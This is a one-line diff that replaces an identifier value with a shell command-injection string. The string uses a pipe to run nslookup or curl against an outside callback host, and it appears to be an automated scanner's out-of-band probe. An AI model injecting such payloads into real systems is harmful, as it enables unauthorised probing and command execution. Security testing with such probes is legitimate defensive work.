@@ -1,1 +1,1 @@
-MO_119135752160_005/.
+|(nslookup -q=cname hitcdcbqtlizv2747d.bxss.me||curl hitcdcbqtlizv2747d.bxss.me)
